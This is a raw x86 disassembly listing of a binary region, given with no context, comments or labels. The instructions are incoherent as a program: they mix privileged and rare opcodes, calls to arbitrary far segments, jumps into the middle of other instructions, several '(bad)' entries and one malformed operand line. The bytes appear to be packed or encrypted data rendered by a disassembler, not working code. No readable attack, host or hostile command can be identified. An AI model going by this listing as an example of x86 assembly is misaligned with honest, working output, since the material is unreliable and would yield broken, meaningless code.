  432607:	add    ah,BYTE PTR [esi+0x18]
  43260a:	inc    ecx
  43260b:	pop    eax
  43260c:	adc    bl,BYTE PTR [ebx+0x26a2e7e]
  432612:	ficomp DWORD PTR [edx+0x33]
  432615:	ins    BYTE PTR es:[edi],dx
  432616:	push   edx
  432617:	add    esp,DWORD PTR [ecx+0x288004f2]
  43261d:	jp     0x4325d7
  43261f:	xchg   esi,eax
  432620:	lods   al,BYTE PTR ds:[esi]
  432621:	leave  
  432622:	inc    esi
  432623:	add    ecx,esp
  432625:	sub    al,0xc
  432627:	add    eax,0xf0dfcde6
  43262c:	mov    eax,0xde68fd0c
  432631:	add    BYTE PTR [eax-0x698cff8a],ah
  432637:	test   DWORD PTR [eax],eax
  432639:	and    ah,BYTE PTR [edi]
  43263b:	inc    edx
  43263c:	fwait
  43263d:	leave  
  43263e:	mov    al,0xf4
  432640:	xchg   esp,eax
  432641:	push   ds
  432642:	sbb    al,0x67
  432644:	not    BYTE PTR [eax]
  432646:	cmp    al,BYTE PTR [ebp-0x31c515fd]
  43264c:	mov    dl,0xd1
  43264e:	mov    esi,0x6d160f81
  432653:	push   ecx
  432654:	xchg   cl,dh
  432656:	hlt    
  432657:	mov    ebp,0xd81bf095
  43265c:	scas   al,BYTE PTR es:[edi]
  43265d:	inc    eax
  43265e:	loop   0x432604
  432660:	and    esi,esp
  432662:	dec    esp
  432663:	fdiv   DWORD PTR [ebp+0x4c]
  432666:	loop   0x432652
  432668:	mov    edx,0x281a09f2
  43266d:	xchg   DWORD PTR [eax-0x31a512eb],eax
  432673:	adc    edx,ecx
  432675:	bound  edi,QWORD PTR [esi+esi*2-0x6d]
  432679:	pop    ebx
  43267a:	inc    ecx
  43267b:	shl    DWORD PTR [ebp-0x602b1c04],1
  432681:	fsub   DWORD PTR [eax+eax*2+0xe]
  432685:	cli    
  432686:	fld    DWORD PTR [edx+0x1e01963]
  43268c:	mov    al,dh
  43268e:	sub    ch,BYTE PTR [ebx+eax*2-0x3de976bb]
  432695:	repz jge 0x43270c
  432698:	jp     0x432643
  43269a:	mov    ds:0x917ea2ab,al
  43269f:	mov    al,ds:0xb84a1ac5
  4326a4:	push   ebx
  4326a5:	test   al,0xa1
  4326a7:	mov    al,ds:0x4e4882a3
  4326ac:	xor    eax,ebx
  4326ae:	lods   eax,DWORD PTR ds:[esi]
  4326af:	ds int3 
  4326b1:	ret    
  4326b2:	test   DWORD PTR [edx+eiz*4-0x637d409e],esi
  4326b9:	inc    ebp
  4326ba:	inc    eax
  4326bb:	jae    0x4326c5
  4326bd:	inc    eax
  4326be:	test   eax,0x46304010
  4326c3:	add    al,0xe2
  4326c5:	inc    edx
  4326c6:	inc    eax
  4326c7:	jnp    0x43265b
  4326c9:	loope  0x432696
  4326cb:	mov    dl,0x48
  4326cd:	mov    ah,0x72
  4326cf:	popa   
  4326d0:	leave  
  4326d1:	and    DWORD PTR [edx+ecx*8-0x67ffb3bf],edi
  4326d8:	pop    esi
  4326d9:	stos   BYTE PTR es:[edi],al
  4326da:	mov    al,ds:0x8cacba9
  4326df:	sahf   
  4326e0:	rcr    BYTE PTR [esi+0x4e],1
  4326e3:	add    eax,0xe6d8604
  4326e8:	cmp    dl,ah
  4326ea:	sub    eax,0x562c5eed
  4326ef:	push   eax
  4326f0:	rcr    DWORD PTR [edx],1
  4326f2:	(bad)  
  4326f4:	push   0x1a
  4326f6:	or     bl,BYTE PTR [ebp+0x34465848]
  4326fc:	mov    eax,ds:0xd8108ea4
  432701:	mov    edx,eax
  432703:	call   0xe84c:0x3ad0b0ee
  43270a:	push   ds
  43270b:	adc    BYTE PTR [esi],al
  43270d:	aam    0xd5
  43270f:	lods   al,BYTE PTR ds:[esi]
  432710:	js     0x43270c
  432712:	add    DWORD PTR [esi+0x4a39ff85],esp
  432718:	sub    BYTE PTR fs:[eax],dh
  43271b:	dec    ebx
  43271c:	call   0xf64fdaf8
  432721:	or     al,BYTE PTR [eax+0x45]
  432724:	test   DWORD PTR [ebp-0x29aa328a],ebp
  43272a:	push   edx
  43272b:	sbb    esi,edx
  43272d:	adc    DWORD PTR [edi+0x62],eax
  432730:	ret    
  432731:	dec    ebp
  432732:	push   ds
  432733:	out    0x0,eax
  432735:	mov    BYTE PTR [edx-0x58],cl
  432738:	test   al,0x96
  43273a:	inc    edx
  43273b:	inc    ecx
  43273c:	shr    DWORD PTR [esi-0x4b4ef7d7],cl
  432742:	cs inc ecx
  432744:	sbb    BYTE PTR [edx-0x270a3c4d],cl
  43274a:	aam    0xea
  43274c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43274d:	push   0x9d1c9a12
  432752:	mov    bh,bl
  432754:	inc    esp
  432755:	es push esp
  432757:	pop    es
  432758:	ret    
  432759:	mov    eax,0x2b022b
  43275e:	xor    DWORD PTR ss:[esp+edi*2-0x4be9eb71],ebp
  432766:	sbb    eax,0xbd3cecbe
  43276b:	call   0xe98c6b06
  432770:	xchg   ebx,eax
  432771:	sbb    dh,0xd2
  432774:	scas   al,BYTE PTR es:[edi]
  432775:	out    0xd4,al
  432777:	(bad)  
  432778:	push   ecx
  432779:	lock and al,0x90
  43277c:	pushf  
  43277d:	repnz sub bh,BYTE PTR [ebx-0x3a0eed78]
  432784:	jbe    0x4327cb
  432786:	mov    ebp,0x2c7638fe
  43278b:	mov    bh,0x46
  43278d:	js     0x432760
  43278f:	cmp    dl,BYTE PTR [eax-0x50]
  432792:	pop    ss
  432793:	push   eax
  432794:	in     al,dx
  432795:	jp     0x43275e
  432797:	jle    0x432757
  432799:	pop    edx
  43279a:	adc    DWORD PTR [eax+0x72ac9830],0x5d390a2a
  4327a4:	sbb    ebp,eax
  4327a6:	push   ss
  4327a7:	clc    
  4327a8:	xchg   dh,ah
  4327aa:	push   ebx
  4327ab:	push   ebp
  4327ac:	push   esi
  4327ad:	sub    BYTE PTR [ecx-0xbf1b9cc],ah
  4327b3:	pop    eax
  4327b4:	test   BYTE PTR [edx],bl
  4327b6:	push   eax
  4327b7:	lahf   
  4327b8:	and    al,0x6d
  4327ba:	jbe    0x43280b
  4327bc:	cmp    al,0xb2
  4327be:	popf   
  4327bf:	adc    al,0x15
  4327c1:	test   al,0x29
  4327c3:	sbb    al,0x92
  4327c5:	arpl   WORD PTR [edx+edx*8-0x22],cx
  4327c9:	jmp    0xc4877084
  4327ce:	enter  0x11d7,0xe8
  4327d2:	push   0x0
  4327d4:	xchg   ebp,eax
  4327d5:	test   al,0x4d
  4327d7:	dec    ebp
  4327d8:	sub    BYTE PTR [esi],dl
  4327da:	mov    al,ds:0xf5efdc73
  4327df:	mov    al,ds:0x8e78091d
  4327e4:	adc    ecx,DWORD PTR [eax-0x39d7e9ae]
  4327ea:	sub    dl,BYTE PTR [eax]
  4327ec:	stos   DWORD PTR es:[edi],eax
  4327ed:	mov    al,ds:0x6806e39c
  4327f2:	shr    BYTE PTR [eax+0x4563ad89],cl
  4327f8:	jmp    0x43283e
  4327fa:	push   ebp
  4327fb:	jl     0x4327a8
  4327fd:	or     ah,BYTE PTR [edi-0x56]
  432800:	add    BYTE PTR [ecx-0x66],cl
  432803:	shl    BYTE PTR [edi+eax*1-0x78ff24e5],1
  43280a:	jbe    0x432834
  43280c:	xor    BYTE PTR [edx+0x4f],cl
  43280f:	inc    eax
  432810:	and    al,0xc0
  432812:	and    eax,0x594e1555
  432817:	dec    esi
  432818:	mov    ch,BYTE PTR [eax+0x21]
  43281b:	ret    0xb0b5
  43281e:	xchg   esi,eax
  43281f:	cdq    
  432820:	xor    ch,BYTE PTR [edx-0x20f44556]
  432826:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432827:	xchg   esi,eax
  432828:	add    BYTE PTR [esi+ebp*4],dl
  43282b:	pop    ebx
  43282c:	add    BYTE PTR [ebp+ecx*4+0x4d],bh
  432830:	mov    al,0xd9
  432832:	add    esp,DWORD PTR [esp+ebp*8-0x32536b25]
  432839:	jmp    0x4327d1
  43283b:	inc    esi
  43283c:	add    eax,0x302458c
  432841:	scas   al,BYTE PTR es:[edi]
  432842:	cmp    BYTE PTR [ecx],dh
  432844:	loop   0x432896
  432846:	aaa    
  432847:	aad    0x75
  432849:	mov    esi,0xfe8498a6
  43284e:	sti    
  43284f:	sub    dh,BYTE PTR [eax]
  432851:	sar    al,cl
  432853:	mov    edx,0x80c464a
  432858:	bound  ebp,QWORD PTR [ebx]
  43285a:	jb     0x43285d
  43285c:	and    cl,dh
  43285e:	cmc    
  43285f:	push   0xffffffb1
  432861:	gs in  eax,dx
  432863:	nop
  432864:	clc    
  432865:	sub    al,0x86
  432867:	jb     0x432831
  432869:	lods   al,BYTE PTR ds:[esi]
  43286a:	fadd   DWORD PTR [esi-0x58]
  43286d:	adc    BYTE PTR [edi],cl
  43286f:	or     eax,0x4a3e601d
  432874:	push   esi
  432875:	sbb    bl,ch
  432877:	in     eax,dx
  432878:	inc    eax
  432879:	cli    
  43287a:	inc    ebx
  43287b:	ficomp DWORD PTR [esi]
  43287d:	sahf   
  43287e:	add    al,dh
  432880:	mov    ecx,0xdc5e2a24
  432885:	bound  edx,QWORD PTR [eax]
  432887:	mov    ds:0xd6eb4a0d,al
  43288c:	loopne 0x432888
  43288e:	or     al,0x2f
  432890:	add    DWORD PTR [ebp+0x6a],ebp
  432893:	push   ss
  432894:	push   edx
  432895:	jbe    0x432827
  432897:	in     al,0x26
  432899:	ror    DWORD PTR [edi],0x12
  43289c:	stos   DWORD PTR es:[edi],eax
  43289d:	test   al,0xd2
  43289f:	leave  
  4328a0:	cwde   
  4328a1:	icebp  
  4328a2:	das    
  4328a3:	rol    BYTE PTR [eax-0x3e],0xae
  4328a7:	and    ah,BYTE PTR [esi+eiz*8+0x6a61fb08]
  4328ae:	js     0x4328d6
  4328b0:	hlt    
  4328b1:	or     al,BYTE PTR [ebx]
  4328b3:	aad    0x98
  4328b5:	lock push cs
  4328b7:	push   ebp
  4328b8:	sbb    al,0xda
  4328ba:	fdiv   DWORD PTR [ebp+0x1c]
  4328bd:	repnz ins BYTE PTR es:[edi],dx
  4328bf:	and    ecx,DWORD PTR [edx]
  4328c1:	stc    
  4328c2:	add    dl,BYTE PTR [esi-0x4c]
  4328c5:	add    dl,BYTE PTR [esi]
  4328c7:	clc    
  4328c8:	cs sub al,ah
  4328cb:	retf   
  4328cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4328cd:	jecxz  0x432862
  4328cf:	mov    eax,ds:0x4179508f
  4328d4:	mov    cl,0x2d
  4328d7:	add    al,0x51
  4328d9:	aam    0x1e
  4328db:	rol    BYTE PTR [edx],1
  4328dd:	add    ch,dh
  4328df:	mov    edx,esp
  4328e1:	stc    
  4328e2:	adc    BYTE PTR [ebx],dl
  4328e4:	sub    BYTE PTR [eax+0x4],bh
  4328e7:	jne    0x432967
  4328e9:	mov    al,0x16
  4328eb:	dec    eax
  4328ec:	add    eax,0x819aa828
  4328f1:	scas   al,BYTE PTR es:[edi]
  4328f2:	pop    esi
  4328f3:	loop   0x4328c3
  4328f5:	push   es
  4328f6:	push   cs
  4328f7:	inc    edx
  4328f8:	push   cs
  4328f9:	add    al,0xb4
  4328fb:	sub    dh,BYTE PTR [esi+0x2aab412f]
  432901:	add    BYTE PTR [esi+0x12],0x5c
  432905:	pop    eax
  432906:	and    eax,0x57849722
  43290b:	adc    al,0x66
  43290d:	push   ebx
  43290e:	mov    edx,0x514568ba
  432913:	shl    ebp,cl
  432915:	fs mov esp,0xd62270a4
  43291b:	cmp    al,al
  43291d:	ss sti 
  43291f:	sub    eax,0xf41eb1fa
  432924:	cmp    bh,BYTE PTR [eax]
  432926:	mov    esp,0xc9a01522
  43292b:	and    al,0x6c
  43292d:	(bad)  
  43292e:	(bad)  [esi+0x3604fc2b]
  432934:	mov    bl,0xb8
  432936:	sbb    ecx,DWORD PTR [ecx]
  432938:	fdiv   QWORD PTR [eax+0x63]
  43293b:	xor    BYTE PTR [ecx],cl
  43293d:	cmp    DWORD PTR [edx-0x26],edx
  432940:	scas   al,BYTE PTR es:[edi]
  432941:	sub    eax,0xaec44154
  432946:	bound  esp,QWORD PTR [eax-0x63e1ddc3]
  43294c:	dec    edx
  43294d:	sbb    esi,DWORD PTR [eax+0x498e3703]
  432953:	sbb    eax,0xd041f8d1
  432958:	fiadd  DWORD PTR [edx-0x7c]
  43295b:	xor    al,0xc1
  43295d:	and    edx,eax
  43295f:	popa   
  432960:	xchg   esp,eax
  432961:	jmp    0x43296b
  432963:	xor    edx,edx
  432965:	cmp    DWORD PTR [ebp-0x59dbf1a],eax
  43296b:	and    ch,cl
  43296d:	loopne 0x4329af
  43296f:	lods   eax,DWORD PTR ds:[esi]
  432970:	mov    ch,0xad
  432972:	call   0x5910:0xb020e267
  432979:	sbb    al,0xe7
  43297b:	sub    cl,ah
  43297d:	push   edi
  43297e:	xor    dl,bl
  432980:	arpl   WORD PTR [edx+0x5e],cx
  432983:	pop    ebp
  432984:	retf   0xdee5
  432987:	fsubr  QWORD PTR [ebx-0x3f]
  43298a:	add    eax,DWORD PTR [ebp+esi*1-0x4ef3efc0]
  432991:	fimul  WORD PTR [ebp-0x39]
  432994:	shr    BYTE PTR [ebx-0x44],0xda
  432998:	xchg   esp,eax
  432999:	enter  0xcae0,0x48
  43299d:	jl     0x4329a0
  43299f:	push   cs
  4329a0:	test   al,0xa1
  4329a2:	bound  edi,QWORD PTR [esi]
  4329a4:	mov    eax,0xfa00812b
  4329a9:	sbb    BYTE PTR [ebp+0x46cd4586],al
  4329af:	pop    ds
  4329b0:	mov    al,0xa1
  4329b2:	jp     0x4329c2
  4329b4:	addr16 mov ah,0x1a
  4329b7:	add    BYTE PTR [edi],0x78
  4329ba:	mov    al,ds:0xb4568d55
  4329bf:	out    0x50,al
  4329c1:	or     dh,BYTE PTR [edi]
  4329c3:	inc    eax
  4329c4:	call   esi
  4329c6:	and    ecx,edi
  4329c8:	lahf   
  4329c9:	pop    ecx
  4329ca:	or     BYTE PTR [edx+eiz*4],al
  4329cd:	or     ah,0x6
  4329d0:	xchg   edi,eax
  4329d1:	aam    0x84
  4329d3:	ret    0x1d12
  4329d6:	mov    edx,cr4
  4329d9:	pop    ecx
  4329da:	nop
  4329db:	add    cl,ch
  4329dd:	add    esi,0xd6b24ba6
  4329e3:	and    BYTE PTR ds:0xa7d360ea,0xf0
  4329ea:	sar    BYTE PTR [ebp-0x176a7339],0xc2
  4329f1:	jno    0x4329b8
  4329f3:	sub    bl,BYTE PTR [eax]
  4329f5:	pop    es
  4329f6:	les    edi,FWORD PTR [eax+0x1c]
  4329f9:	lods   eax,DWORD PTR ds:[esi]
  4329fa:	jl     0x4329a2
  4329fc:	stos   BYTE PTR es:[edi],al
  4329fd:	fild   WORD PTR [eax-0x7b]
  432a00:	mov    dh,0xee
  432a02:	pop    edx
  432a03:	mov    ah,0x24
  432a05:	jl     0x4329b2
  432a07:	mov    dl,0x55
  432a09:	add    eax,0x7f30769c
  432a0e:	dec    ebx
  432a0f:	cs mov edx,0x8153e8d5
  432a15:	adc    eax,DWORD PTR [edx-0x64]
  432a18:	push   esp
  432a19:	mov    ds:0x529b9443,al
  432a1e:	inc    ecx
  432a1f:	inc    ecx
  432a20:	mov    ebp,DWORD PTR [edx+ecx*2+0x24]
  432a24:	int3   
  432a25:	sbb    bl,BYTE PTR [esi]
  432a27:	push   eax
  432a28:	lods   eax,DWORD PTR ds:[esi]
  432a29:	push   cs
  432a2a:	push   cs
  432a2b:	or     BYTE PTR [esi-0x68],0x9b
  432a2f:	add    esi,DWORD PTR [edx]
  432a31:	aam    0x9
  432a33:	sub    al,0x29
  432a35:	stos   BYTE PTR es:[edi],al
  432a36:	nop
  432a37:	iret   
  432a38:	sub    BYTE PTR [edx+eiz*4+0x2eb1c0b1],ch
  432a3f:	mov    esi,0xea06b468
  432a44:	push   es
  432a45:	mov    BYTE PTR [ebx+0x68],al
  432a48:	cmp    esp,DWORD PTR [edx*2+0x26f6ca94]
  432a4f:	adc    al,0xc
  432a51:	jmp    0xe0effa6b
  432a56:	or     bl,bl
  432a58:	pop    esp
  432a59:	sub    eax,0x8afb0d43
  432a5e:	lock cmp dl,BYTE PTR [edx-0x32]
  432a62:	dec    ebp
  432a63:	ins    BYTE PTR es:[edi],dx
  432a64:	sub    cl,BYTE PTR [ebx-0x22]
  432a67:	(bad)  
  432a68:	push   edx
  432a69:	outs   dx,BYTE PTR ds:[esi]
  432a6a:	jle    0x432ab0
  432a6c:	outs   dx,DWORD PTR ds:[esi]
  432a6d:	adc    bl,BYTE PTR [edi-0x55cea004]
  432a73:	adc    BYTE PTR [eax],dl
  432a75:	dec    ecx
  432a76:	xchg   edi,eax
  432a77:	xchg   edx,eax
  432a78:	sbb    dh,dh
  432a7a:	jp     0x432a17
  432a7c:	push   ebp
  432a7d:	shr    DWORD PTR [eax],1
  432a7f:	dec    esi
  432a80:	(bad)  
  432a81:	mov    eax,0x2a64d63e
  432a86:	jae    0x432a32
  432a88:	mov    BYTE PTR [ebx+0x11],al
  432a8b:	call   0xfd84:0x4b33cc8
  432a92:	mov    dh,0x5e
  432a94:	je     0x432a3f
  432a96:	inc    esi
  432a97:	pushf  
  432a98:	icebp  
  432a99:	mov    bl,al
  432a9b:	cmp    ch,BYTE PTR [esi-0x7834c57a]
  432aa1:	xchg   esi,eax
  432aa2:	addr16 cmp eax,0x54323889
  432aa8:	add    al,0xc
  432aaa:	cmp    ch,BYTE PTR [ecx-0xa]
  432aad:	add    eax,0xb45e8161
  432ab2:	cs shr esi,1
  432ab5:	jmp    0xd684:0x1582940
  432abc:	xchg   BYTE PTR [edx-0x24],ah
  432abf:	ret    
  432ac0:	dec    ebp
  432ac1:	mov    eax,ds:0x7485d
  432ac6:	mov    al,ds:0xc303fac
  432acb:	in     eax,dx
  432acc:	pop    ss
  432acd:	mov    al,0xde
  432acf:	mov    fs,WORD PTR [ecx-0x23374c90]
  432ad5:	cmp    esi,edx
  432ad7:	fcom   DWORD PTR [ecx-0x20]
  432ada:	mov    al,0x28
  432adc:	push   es
  432add:	xor    eax,0xb92c3a12
  432ae2:	jbe    0x432b60
  432ae4:	cwde   
  432ae5:	inc    esi
  432ae6:	out    dx,al
  432ae7:	inc    edx
  432ae8:	sub    BYTE PTR [esi+0x327a0202],dh
  432aee:	mov    ah,0x3a
  432af0:	lds    ebp,FWORD PTR [edx+0x4bf8bf60]
  432af6:	arpl   WORD PTR [ebx-0x72],dx
  432af9:	xchg   esp,eax
  432afa:	outs   dx,DWORD PTR ds:[esi]
  432afb:	fwait
  432afc:	out    dx,al
  432afd:	fld    TBYTE PTR [ecx+0x0]
  432b00:	or     ecx,DWORD PTR [eax]
  432b02:	fdiv   DWORD PTR [esp+ebx*1+0x4a]
  432b06:	ret    0xc0d1
  432b09:	fisubr WORD PTR [ebp-0x43]
  432b0c:	sub    edx,DWORD PTR cs:[esp+eax*1+0x28da6434]
  432b14:	xchg   edx,eax
  432b15:	pop    edx
  432b16:	imul   edi,esi,0xffffff82
  432b19:	cmp    BYTE PTR [esi+0x1a0019be],dl
  432b1f:	fwait
  432b20:	add    BYTE PTR [edi],bl
  432b22:	cld    
  432b23:	fsub   QWORD PTR [esi-0x54fc02f0]
  432b29:	dec    esp
  432b2a:	add    al,0xe
  432b2c:	div    BYTE PTR [eax]
  432b2e:	and    ebp,ecx
  432b30:	sbb    al,ah
  432b32:	and    esp,DWORD PTR [esi]
  432b34:	xchg   edi,eax
  432b35:	in     eax,0xe0
  432b37:	cs test al,0x41
  432b3a:	popa   
  432b3b:	mov    eax,ds:0xfe5a2a8e
  432b40:	imul   ecx,DWORD PTR [edx-0x6d41995a],0x8700de6f
  432b4a:	cmp    cl,BYTE PTR [edx]
  432b4c:	out    0x5e,eax
  432b4e:	aam    0x46
  432b50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  432b51:	push   esi
  432b52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  432b53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432b54:	mov    ecx,0x41027110
  432b59:	adc    BYTE PTR [ebp-0x1e],ch
  432b5c:	rcl    BYTE PTR [eax-0x64],1
  432b5f:	call   0x48a3:0x5242a6c
  432b66:	add    al,0x2a
  432b68:	or     BYTE PTR [esi+0x7c],bh
  432b6b:	adc    BYTE PTR [ecx+0x4a462cc2],dh
  432b71:	jbe    0x432b11
  432b73:	push   ebp
  432b74:	pusha  
  432b75:	pop    edx
  432b76:	aad    0x8e
  432b78:	dec    esp
  432b79:	lock push cs
  432b7b:	(bad)  
  432b7d:	add    BYTE PTR [ebx-0x12737ed9],bh
  432b83:	adc    ah,ch
  432b85:	add    al,0xfa
  432b87:	mov    bh,al
  432b89:	clc    
  432b8a:	fdecstp 
  432b8c:	inc    eax
  432b8d:	call   0xef93b1a9
  432b92:	je     0x432b88
  432b94:	push   edx
  432b95:	dec    esp
  432b96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  432b97:	aam    0x0
  432b99:	test   al,0xbe
  432b9b:	sbb    dl,bh
  432b9d:	jne    0x432b4c
  432b9f:	sub    ah,ch
  432ba1:	cmp    BYTE PTR [edx],dl
  432ba3:	cmp    eax,0x13757bfc
  432ba8:	je     0x432b6a
  432baa:	push   ds
  432bab:	sbb    DWORD PTR [eax-0x60],ebp
  432bae:	or     BYTE PTR [esi+0x30fad5a9],bl
  432bb4:	mov    cl,0xa0
  432bb6:	stos   BYTE PTR es:[edi],al
  432bb7:	adc    cl,BYTE PTR [eax+esi*1+0x44a7f693]
  432bbe:	xor    al,0x1
  432bc0:	stos   BYTE PTR es:[edi],al
  432bc1:	cmp    cl,BYTE PTR [eax+0x4259d26c]
  432bc7:	sub    ch,dl
  432bc9:	icebp  
  432bca:	or     al,0x14
  432bcc:	div    BYTE PTR [ebp-0x6]
  432bcf:	(bad)  
  432bd0:	adc    ch,ch
  432bd2:	xchg   esp,eax
  432bd3:	ss xor al,0xb1
  432bd6:	mov    al,ds:0x3a98cec4
  432bdb:	rcl    BYTE PTR [esi+ebx*1+0x67cfc04],1
  432be2:	outs   dx,DWORD PTR ds:[esi]
  432be3:	mov    al,ds:0x4c16e881
  432be8:	inc    ebp
  432be9:	loop   0x432c5b
  432beb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432bec:	push   ss
  432bed:	inc    esp
  432bee:	test   eax,0x64807ecd
  432bf3:	or     DWORD PTR [ebx],ebx
  432bf5:	sub    BYTE PTR [eax+0x2c],dh
  432bf8:	not    BYTE PTR [esp+edi*2+0x1b]
  432bfc:	aas    
  432bfd:	sub    al,BYTE PTR [ecx+0x408acebb]
  432c03:	fdivr  DWORD PTR [esi]
  432c05:	push   edx
  432c06:	fidiv  DWORD PTR [esi+ebp*4+0x62]
  432c0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  432c0b:	inc    edx
  432c0c:	jp     0x432baf
  432c0e:	mov    edi,0x869f55a5
  432c13:	sub    bl,BYTE PTR [edi+0x3231ba00]
  432c19:	rcr    dl,1
  432c1b:	xor    edi,DWORD PTR [eax+0x46babe1b]
  432c21:	cmp    DWORD PTR ds:0x14e1d342,esp
  432c27:	mov    ah,0x85
  432c29:	hlt    
  432c2a:	push   esp
  432c2b:	js     0x432c76
  432c2d:	mov    eax,ds:0x2498b6d9
  432c32:	xchg   esp,eax
  432c33:	dec    edx
  432c34:	into   
  432c35:	mov    al,ds:0xa6c658e0
  432c3a:	adc    ah,bl
  432c3c:	xor    DWORD PTR [esi+0x32],eax
  432c3f:	add    eax,0xffffffb0
  432c42:	int    0x64
  432c44:	pop    eax
  432c45:	fsub   st(1),st
  432c47:	push   ss
  432c48:	les    esp,FWORD PTR [ecx-0x51]
  432c4b:	and    eax,0x8601ba14
  432c50:	sar    BYTE PTR [esp+eax*8+0x5e],1
  432c54:	ret    0xd158
  432c57:	push   esp
  432c58:	add    BYTE PTR [esi-0x26],0x18
  432c5c:	xchg   BYTE PTR [esi+eiz*8+0x42],al
  432c60:	jo     0x432be4
  432c62:	shr    BYTE PTR [eax+ecx*2+0x50d9924e],1
  432c69:	jno    0x432c6b
  432c6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432c6c:	sbb    ebp,esi
  432c6e:	addr16 ret 0x67fd
  432c72:	inc    eax
  432c73:	fwait
  432c74:	popa   
  432c75:	adc    DWORD PTR [ecx+ebx*8],0x10
  432c79:	push   cs
  432c7a:	les    eax,FWORD PTR [eax+ebx*8+0x2f2a86a2]
  432c81:	xor    eax,0x8c9e2012
  432c86:	outs   dx,BYTE PTR ds:[esi]
  432c87:	mov    DWORD PTR [edx-0x7e07952],ebp
  432c8d:	int3   
  432c8e:	inc    esp
  432c8f:	jo     0x432d0f
  432c91:	sahf   
  432c92:	shl    BYTE PTR [edx-0x251bd8de],cl
  432c98:	jbe    0x432c38
  432c9a:	push   edi
  432c9b:	xor    al,0xb0
  432c9d:	(bad)  
  432c9e:	loopne 0x432cf3
  432ca0:	jo     0x432c2b
  432ca2:	sub    al,0xc1
  432ca4:	cli    
  432ca5:	aam    0x6c
  432ca7:	adc    ebp,DWORD PTR [esp+ebp*2]
  432caa:	mov    edx,DWORD PTR [ebp-0x1c182958]
  432cb0:	retf   0x9182
  432cb3:	loop   0x432c48
  432cb5:	inc    eax
  432cb6:	xor    esi,esi
  432cb8:	sbb    eax,0x16f86d0e
  432cbd:	mov    cl,0xa3
  432cbf:	mov    al,ds:0xafdbd86b
  432cc4:	xchg   esi,eax
  432cc5:	aad    0xad
  432cc7:	push   ebp
  432cc8:	lods   eax,DWORD PTR ds:[esi]
  432cc9:	push   0xffffffda
  432ccb:	mov    ?,WORD PTR [eax+0x7c]
  432cce:	mov    BYTE PTR [esi],0x7f
  432cd1:	call   0x7e8a:0x90d22284
  432cd8:	adc    edi,DWORD PTR [esp+esi*1]
  432cdb:	and    eax,0xe0b638
  432ce0:	scas   al,BYTE PTR es:[edi]
  432ce1:	into   
  432ce2:	test   al,0x8a
  432ce4:	dec    esp
  432ce5:	stos   BYTE PTR es:[edi],al
  432ce6:	xor    eax,DWORD PTR [ecx-0x79b36ad2]
  432cec:	hlt    
  432ced:	dec    eax
  432cee:	neg    BYTE PTR [edi-0x2c53f52e]
  432cf4:	xchg   esi,eax
  432cf5:	inc    esi
  432cf6:	and    al,BYTE PTR ds:0x58124700
  432cfc:	mov    BYTE PTR [esi+0xb],ah
  432cff:	inc    ebp
  432d00:	add    ah,BYTE PTR [edi+0x63d0c6fa]
  432d06:	jmp    0xd670a3ac
  432d0b:	pop    edx
  432d0c:	xchg   ebx,eax
  432d0d:	fisttp WORD PTR [bx+di]
  432d10:	loope  0x432c94
  432d12:	cmp    cl,BYTE PTR [esi-0x10]
  432d15:	add    BYTE PTR fs:[edi+0x5adb001a],cl
  432d1c:	repz xor bl,0xc6
  432d20:	sub    eax,0xdee4008c
  432d25:	fsub   QWORD PTR [ecx-0x5f777c36]
  432d2b:	les    eax,FWORD PTR [edx]
  432d2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432d2e:	add    BYTE PTR [eax+0x4e],ah
  432d31:	dec    edx
  432d32:	loop   0x432d82
  432d34:	jecxz  0x432d2c
  432d36:	inc    ecx
  432d37:	fcmovb st,st(1)
  432d39:	iret   
  432d3a:	add    al,0x2e
  432d3c:	add    dl,dl
  432d3e:	faddp  st(5),st
  432d40:	daa    
  432d41:	sbb    DWORD PTR ds:0xdaec4b90,0xad09a3e
  432d4b:	pushf  
  432d4c:	push   edx
  432d4d:	lahf   
  432d4e:	inc    eax
  432d4f:	in     al,0xe6
  432d51:	hlt    
  432d52:	mov    eax,ds:0xd05492a6
  432d57:	into   
  432d58:	jno    0x432d1a
  432d5a:	pop    esp
  432d5b:	test   dl,ah
  432d5d:	push   ss
  432d5e:	adc    al,0xb5
  432d60:	mov    ss,ecx
  432d62:	ins    BYTE PTR es:[edi],dx
  432d63:	call   0xd693ffd8
  432d68:	jb     0x432db0
  432d6a:	stc    
  432d6b:	pop    ebx
  432d6c:	ret    
  432d6d:	mov    bh,0xd1
  432d6f:	inc    esi
  432d70:	xchg   ebp,eax
  432d71:	bound  ebx,QWORD PTR [edx-0x5c]
  432d74:	xor    DWORD PTR [esi-0x48],0xed8e820a
  432d7b:	adc    DWORD PTR [esi],ebp
  432d7d:	repnz and ah,BYTE PTR ds:0x3cb5b85e
  432d84:	inc    edi
  432d85:	test   al,0xcb
  432d87:	push   0x33769bee
  432d8c:	mov    esi,0x8ec0d0f5
  432d91:	jp     0x432d65
  432d93:	xchg   edi,eax
  432d94:	mov    eax,0x83a5eb58
  432d99:	add    edx,0xb60d6c13
  432d9f:	aam    0x58
  432da1:	jo     0x432da4
  432da3:	arpl   bp,ax
  432da5:	rol    DWORD PTR [eax+0x7c],0xd8
  432da9:	sub    esp,DWORD PTR [edi-0x7c164e7e]
  432daf:	jle    0x432e29
  432db1:	jo     0x432d5b
  432db3:	lea    ecx,[eax]
  432db5:	cli    
  432db6:	inc    eax
  432db7:	mov    esp,0x32631bd2
  432dbc:	and    al,0x94
  432dbe:	fiadd  WORD PTR [esi-0x78b3e38a]
  432dc4:	or     al,0xd4
  432dc6:	aas    
  432dc7:	bound  esp,QWORD PTR [esi+0x11]
  432dca:	popf   
  432dcb:	adc    BYTE PTR [eax],dh
  432dcd:	(bad)  
  432dce:	push   eax
  432dcf:	test   BYTE PTR [esi+0x13],dl
  432dd2:	or     ecx,DWORD PTR [edx+ecx*1-0x12]
  432dd6:	or     dh,al
  432dd8:	pop    es
  432dd9:	sbb    DWORD PTR [ebx],edi
  432ddb:	cld    
  432ddc:	pop    ecx
